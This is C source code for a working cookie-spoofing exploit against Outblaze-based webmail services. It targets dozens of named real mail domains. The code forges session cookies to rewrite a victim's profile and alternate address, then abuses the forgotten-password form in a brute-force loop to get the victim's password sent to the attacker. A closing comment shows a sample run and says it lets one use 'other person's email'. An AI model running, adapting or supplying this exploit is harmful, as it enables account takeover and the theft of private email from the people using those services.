/*
**
** Outblaze Web based e-mail User Cookie Spoofing 0day exploit
**
** --
** exploit by "you dong-hun"(Xpl017Elz), <szoahc@hotmail.com>.
** My World: http://x82.i21c.net & http://x82.inetcop.org
**
** Greets: INetCop(c) Security family, my friends.
*/
/*
** This exploit code is very simple, but is convenient.
** This can hack almost Outblaze Web based e-mail service. w00h00~!
**
** It may give password to you.
** Try about 20 times. When attack failed, retry.
** It may inform to you necessarily.
**
** This can test in Korean several sites but, I excluded it.
** Use in research !!!
** When abuse this, clear that there is no responsibility to us.
**
** P.S: Sorry, for my poor english.
*/

#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

#define X82 0x82
#define D_M 0
#define P_M 1
#define B_M 0x14
#define _B_SIZE 0x800

struct eat
{
	int num;
	char *mail_host;
	char *host_oa;
	char *word;
	char *domain;
};

struct eat vulns[]=
{
	{
	    	/* exploitable */
		0,"www.amrer.net",
		"amrer_net_oa",";",
		"amrer.net"
	},
	{
	    	/* exploitable */
	    	1,"www.amuro.net",
		"amuro_net_oa",";",
		"amuro.net"
	},
	{
	    	/* exploitable */
	    	2,"freemail.amuromail.com",
		"amuromail_com_oa",";",
		"amuromail.com"
	},
	{
	    	/* exploitable */
	    	3,"www.astroboymail.com",
		"astroboymail_com_oa",";",
		"astroboymail.com"
	},
	{
	    	/* exploitable */
	    	4,"www.dbzmail.com",
		"dbzmail_com_oa",";",
		"dbzmail.com"
	},
	{
	    	/* exploitable */
	    	5,"www.doramail.com",
		"doramail_com_oa",";",
		"doramail.com"
	},
	{
	    	/* exploitable */
	    	6,"www.glay.org",
		"glay_org_oa",";",
		"glay.org"
	},
	{
	    	/* exploitable */
	    	7,"www.jpopmail.com",
		"jpopmail_com_oa",";",
		"jpopmail.com"
	},
	{
	    	/* exploitable */
	    	8,"www.keromail.com",
		"keromail_com_oa",";",
		"keromail.com"
	},
	{
	    	/* exploitable */
	    	9,"www.kichimail.com",
		"kichimail_com_oa",";",
		"kichimail.com"
	},
	{
	    	/* exploitable */
	    	10,"www.norikomail.com",
		"norikomail_com_oa",";",
		"norikomail.com"
	},
	{
	    	/* exploitable */
	    	11,"www.otakumail.com",
		"otakumail_com_oa",";",
		"otakumail.com"
	},
	{
	    	/* exploitable */
	    	12,"mail.smapxsmap.net",
		"smapxsmap_net_oa",";",
		"smapxsmap.net"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	13,"www.uymail.com",
		"uymail_com_oa",";",
		"uymail.com"
	},
	{
	    	/* exploitable */
	    	14,"www.yyhmail.com",
		"yyhmail_com_oa",";",
		"yyhmail.com"
	},
	{
	    	/* exploitable */
	    	15,"mail.china139.com",
		"china139_com_oa",";",
		"china139.com"
	},
	{
	    	/* exploitable */
	    	16,"mymail.mailasia.com", /* mymail chk */
		"mailasia_com_oa","%3Amailasia.com;",
		"mailasia.com"
	},
	{
	    	/* exploitable */
	    	17,"www.aaronkwok.net",
		"aaronkwok_net_oa",";",
		"aaronkwok.net"
	},
	{
	    	/* exploitable */
	    	18,"mymail.bsdmail.com", /* mymail chk */
		"bsdmail_com_oa","%3Absdmail.com;",
		"bsdmail.com"
	},
	{
	    	/* exploitable */
	    	19,"mymail.bsdmail.com", /* mymail chk */
		"bsdmail_com_oa","%3Absdmail.org;",
		"bsdmail.org"
	},
	{
	    	/* exploitable */
	    	20,"www.ezagenda.com",
		"ezagenda_com_oa",";",
		"ezagenda.com"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	21,"www.fastermail.com",
		"fastermail_com_oa",";",
		"fastermail.com"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	22,"mail.wongfaye.com",
		"wongfaye_com_oa",";",
		"wongfaye.com"
	},
	{
	    	/* exploitable */
	    	23,"www.graffiti.net",
		"graffiti_net_oa",";",
		"graffiti.net"
	},
	{
	    	/* exploitable */
	    	24,"www.hackermail.com",
		"hackermail_com_oa",";",
		"hackermail.com"
	},
	{
	    	/* exploitable */
	    	25,"mail.kellychen.com",
		"kellychen_com_oa",";",
		"kellychen.com"
	},
	{
	    	/* exploitable */
	    	26,"www.leonlai.net",
		"leonlai_net_oa",";",
		"leonlai.net"
	},
	{
	    	/* exploitable */
	    	27,"mymail.linuxmail.org", /* mymail chk */
		"linuxmail_org_oa","%3Alinuxmail.org;",
		"linuxmail.org"
	},
	{
	    	/* exploitable */
	    	28,"mymail.outblaze.net", /* mymail chk */
		"outblaze_net_oa","%3Aoutblaze.net;",
		"outblaze.net"
	},
	{
	    	/* exploitable */
	    	29,"mymail.outblaze.net", /* mymail chk */
		"outblaze_net_oa","%3Aoutblaze.org;",
		"outblaze.org"
	},
	{
	    	/* exploitable */
	    	30,"mymail.outgun.com", /* mymail chk */
		"outgun_com_oa","%3Aoutgun.com;",
		"outgun.com"
	},
	{
	    	/* exploitable */
	    	31,"www.surfy.net",
		"surfy_net_oa",";",
		"surfy.net"
	},
	{
	    	/* exploitable */
	    	32,"mail.pakistans.com",
		"pakistans_com_oa",";",
		"pakistans.com"
	},
	{
	    	/* exploitable */
	    	33,"www.jaydemail.com",
		"jaydemail_com_oa",";",
		"jaydemail.com"
	},
	{
	    	/* exploitable */
	    	34,"mail.joinme.com",
		"joinme_com_oa",";",
		"joinme.com"
	},
	{
	    	/* exploitable */
	    	35,"www.marchmail.com",
		"marchmail.com",";",
		"marchmail.com"
	},
	{
	    	/* exploitable */
	    	36,"mail.nctta.org",
		"nctta_org_oa",";",
		"nctta.org"
	},
	{
	    	/* exploitable */
	    	37,"mail.portugalnet.com",
		"portugalnet_com_oa",";",
		"portugalnet.com"
	},
	{
	    	/* exploitable */
	    	38,"www.boardermail.com",
		"boardermail_com_oa",";",
		"boardermail.com"
	},
	{
	    	/* exploitable */
	    	39,"mymail.mailpuppy.com", /* mymail chk */
		"mailpuppy_com_oa","%3Amailpuppy.com;",
		"mailpuppy.com"
	},
	{
	    	/* exploitable */
	    	40,"www.melodymail.com",
		"melodymail_com_oa",";",
		"melodymail.com"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	41,"www.twinstarsmail.com",
		"twinstarsmail_com_oa",";",
		"twinstarsmail.com"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	42,"www.purinmail.com",
		"purinmail_com_oa",";",
		"purinmail.com"
	},
	{
	    	/* exploitable */
	    	43,"www.gundamfan.com",
		"gundamfan_com_oa",";",
		"gundamfan.com"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	44,"www.slamdunkfan.com",
		"slamdunkfan_com_oa",";",
		"slamdunkfan.com"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	45,"www.movemail.com",
		"movemail_com_oa",";",
		"movemail.com"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	46,"mail.startvclub.com",
		"startvclub_com_oa",";",
		"startvclub.com"
		/* shit, error hint answer form */
	},
	{
	    	/* exploitable */
	    	47,"www.ultrapostman.com",
		"ultrapostman_com_oa",";",
		"ultrapostman.com"
	},
	{
	    	/* exploitable */
	    	48,"mail.sailormoon.com",
		"sailormoon_com_oa",";",
		"sailormoon.com"
	},
	{
	    	X82,"x82.inetcop.org",
		NULL,NULL,NULL
	}
};

int target=D_M;
int sexsock(char *host);
int __make_xpl(char *__xploit_buf,char *tg_id,char *my_mail,int flag);
void re_connt(int sock);
void usage(char *x_name);
void banrl();
int g_pass_chk(char *buf,int size);

int main(int argc, char *argv[])
{
    	char pass_chk_st[]="This is your password: ";
    	int sock,whgo;
#define MAIL_ID "xploit"
	char m_id[X82]=MAIL_ID;
#define UR_MAIL_ADDRESS "xploit"
	char u_id[X82]=UR_MAIL_ADDRESS;
	u_char __x_buf[_B_SIZE];
	char __r_buf[_B_SIZE];
	memset((u_char *)__x_buf,D_M,sizeof(__x_buf));
	memset((char *)__r_buf,D_M,sizeof(__r_buf));

	(void)banrl();
	while((whgo=getopt(argc,argv,"t:i:m:h"))!=-P_M)
	{
	    	extern char *optarg;
		switch(whgo)
		{
			case 't':
			    	target=atoi(optarg);
				if(target>48)
				{
				    	(void)usage(argv[D_M]);
				}
				break;

		    	case 'i':
			    	memset((char *)m_id,D_M,sizeof(m_id));
				strncpy(m_id,optarg,sizeof(m_id)-P_M);
				break;

			case 'm':
				memset((char *)u_id,D_M,sizeof(u_id));
				strncpy(u_id,optarg,sizeof(u_id)-P_M);
				break;

			case 'h':
				(void)usage(argv[D_M]);
				break;

			case '?':
				fprintf(stderr,"Try `%s -h' for more information.\n",argv[D_M]);
				exit(-P_M);
				break;

		}
	}
	if(!strcmp(m_id,MAIL_ID)||!strcmp(u_id,UR_MAIL_ADDRESS))
	{
	    	(void)usage(argv[D_M]);
		exit(-P_M);
	}
	else
	{
	    	int bf;
		{
		    	fprintf(stdout," ============================================================\n");
		    	fprintf(stdout,"  ++ Cookie Spoofing Brute-force mode. ++\n\n");
			fprintf(stdout,"  [*] Connected to http://%s/.\n",vulns[target].mail_host);
			fprintf(stdout,"  [*] target mail address: %s@%s.\n",m_id,vulns[target].domain);
			fprintf(stdout,"  [*] Wait, getting password:\n");
		}
		for(bf=D_M;bf<B_M;bf++)
		{
    		    	sock=(int)sexsock(vulns[target].mail_host);
			(void)re_connt(sock);
			(int)__make_xpl(__x_buf,m_id,u_id,D_M);
			send(sock,__x_buf,strlen(__x_buf),D_M);
			memset((char *)__x_buf,D_M,sizeof(__x_buf));
			close(sock);

			sock=(int)sexsock(vulns[target].mail_host);
			(void)re_connt(sock);
			(int)__make_xpl(__x_buf,m_id,u_id,P_M);
			send(sock,__x_buf,strlen(__x_buf),D_M);
			recv(sock,__r_buf,sizeof(__r_buf)-P_M,D_M);
			close(sock);

			if(NULL!=(char *)strstr(__r_buf,pass_chk_st))
			{
			    	if(g_pass_chk((char *)strstr(__r_buf,pass_chk_st),
		    			    strlen((char *)strstr(__r_buf,pass_chk_st))))
				{
					fprintf(stdout,"  [*] Password sent out by your e-mail (%s).\n",u_id);
					break;
				}
				else
				{
				    	fprintf(stdout,"  [%02d] Use Brute-force mode, connect again ...\n",bf);
				}
			}
			else
			{
			    	fprintf(stdout,"  [%02d] Use Brute-force mode, connect again ...\n",bf);
			}
		}
		fprintf(stdout," ============================================================\n\n");
		exit(D_M);
	}
}

int __make_xpl(char *__xploit_buf,char *tg_id,char *my_mail,int flag)
{
    	/* It's my method */
    	char first_tg[]="/scripts/common/profile.cgi";
	char second_tg[]="/scripts/common/forgotpasswd.cgi";
#define LOGIN_SID "login=ff8eb9385445b9f3732c6945bb666024e859ddee6b71f87a&sid="
	char f_data[_B_SIZE];

	if(!flag)
	{
		memset((char *)f_data,D_M,sizeof(f_data));
		snprintf(f_data,sizeof(f_data)-P_M,
				"first_name=Happy-Exploit&last_name=Happy-Exploit&day_of_birth=1&"
				"month_of_birth=1&year_of_birth=1900&gender=male&country=KR&"
				"occupation=Professional&incomerange=40k&education=techschool&"
				"householdsize=3&icq_1=0&ac_address=%s&hint_q=vulnerable&hint_a=exploitable&%s",
				my_mail,(LOGIN_SID));
		memset((char *)__xploit_buf,D_M,_B_SIZE);
		snprintf(__xploit_buf,_B_SIZE-P_M,
				"POST %s HTTP/1.0\r\n"
				"Host: %s\r\n"
				"Cookie: test_cookie=; ob_cookies=%s%s %s=\r\n"
				"Content-type: application/x-www-form-urlencoded\r\n"
				"Content-length: %d\r\n\r\n"
				"%s\r\n\r\n",
				first_tg,vulns[target].mail_host,
				tg_id,vulns[target].word,
				vulns[target].host_oa,
				strlen(f_data),f_data);
	}
	else
	{
		switch(target)
		{
		    	case 16:
			case 27:
			case 30:
			    	memset((char *)f_data,D_M,sizeof(f_data));
				snprintf(f_data,sizeof(f_data)-P_M,
						"domain=%s&login=%s&first_name=Happy-Exploit&last_name=Happy-Exploit&"
						"year_or_birth=0&occupation=Professional&alternative_email=%s"
						"&hint_a=exploitable&answer_hq=SUBMIT",
						vulns[target].domain,tg_id,my_mail);
				break;

			case 18:
			case 19:
			case 28:
			case 29:
			case 39:
				memset((char *)f_data,D_M,sizeof(f_data));
				snprintf(f_data,sizeof(f_data)-P_M,
						"login=%s@%s&first_name=Happy-Exploit&last_name=Happy-Exploit&"
						"year_of_birth=0&occupation=Professional&alternative_email=%s"
						"&hint_a=exploitable&answer_hq=SUBMIT",
						tg_id,vulns[target].domain,my_mail);
				break;

			default:
				memset((char *)f_data,D_M,sizeof(f_data));
				snprintf(f_data,sizeof(f_data)-P_M,
						"login=%s&first_name=Happy-Exploit&last_name=Happy-Exploit&"
						"year_of_birth=0&occupation=Professional&alternative_email=%s"
						"&hint_a=exploitable&answer_hq=SUBMIT",
						tg_id,my_mail);
				break;
		}

		memset((char *)__xploit_buf,D_M,_B_SIZE);
		snprintf(__xploit_buf,_B_SIZE-P_M,
				"POST %s HTTP/1.0\r\n"
				"Host: %s\r\n"
				"Content-type: application/x-www-form-urlencoded\r\n"
				"Content-length: %d\r\n\r\n"
				"%s\r\n\r\n",
				second_tg,vulns[target].mail_host,strlen(f_data),f_data);
	}
}

int g_pass_chk(char *buf,int size)
{
	char passwd[X82];
	int sz_1_=D_M;
	memset((char *)passwd,D_M,sizeof(passwd));

	for(sz_1_=D_M;sz_1_<size
		&&!(buf[sz_1_+D_M]=='<'&&buf[sz_1_+P_M]=='/');sz_1_++)
	{
	    	passwd[sz_1_]=buf[sz_1_];
	}
	fprintf(stdout,"\n  %s\n\n",passwd);
	return(P_M);
}

int sexsock(char *host)
{
    	int sock;
	struct hostent *he;
	struct sockaddr_in x82;

	if((he=gethostbyname(host))==NULL)
	{
	    	return(-P_M);
	}
	if((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-P_M)
	{
	    	return(-P_M);
	}
	x82.sin_family=AF_INET;
	x82.sin_port=htons(80);
	x82.sin_addr=*((struct in_addr *)he->h_addr);
	memset(&(x82.sin_zero),D_M,8);

	if(connect(sock,(struct sockaddr *)&x82,sizeof(struct sockaddr))==-P_M)
	{
	    	return(-P_M);
	}
	return(sock);
}

void re_connt(int sock)
{
    	if(sock==-P_M)
	{
	    	fprintf(stderr," [X] Connect Failed.\n");
		exit(-P_M);
	}
}

void usage(char *x_name)
{
    	int t=D_M;
    	fprintf(stdout," Usage: %s -option [argument]\n",x_name);
	fprintf(stdout,"\n\t-t [target num]     - target mail server.\n");
	fprintf(stdout,"\t-i [mail id]        - target mail id.\n");
	fprintf(stdout,"\t-m [mail addr]      - your mail address.\n");
	fprintf(stdout,"\t-h                  - help information.\n\n");
	fprintf(stdout," Select target mail number:\n\n");
	while(P_M)
	{
	    	if(vulns[t].num==X82)
		{
		    	break;
		}
		else fprintf(stdout," {%d} %s\n",vulns[t].num,vulns[t].domain);
		t++;
	}
	fprintf(stdout,"\n Example> %s -t 0 -i admin -m your_mail@mail.com\n\n",x_name);
	exit(-P_M);
}

void banrl()
{
    	fprintf(stdout,"\n Outblaze Web based e-mail User Cookie Spoofing 0day exploit\n");
	fprintf(stdout,"                                               by Xpl017Elz.\n\n");
}

/*
**
** Very Fun Result: --
**
** bash$ ./0x82-eat_outblaze_0dayxpl -t 24 -i tester -m attacker@testmail.com
**
**  Outblaze Web based e-mail User Cookie Spoofing 0day exploit
**                                                by Xpl017Elz.
**
**  ============================================================
**   ++ Cookie Spoofing Brute-force mode. ++
**
**   [*] Connected to http://www.hackermail.com/.
**   [*] target mail address: tester@hackermail.com.
**   [*] Wait, getting password:
**
**   This is your password: Happy-Exploit
**
**   [*] Password sent out by your e-mail (attacker@testmail.com).
**  ============================================================
**
** bash$
** --
**
** You can use other person's email through this.
**
*/
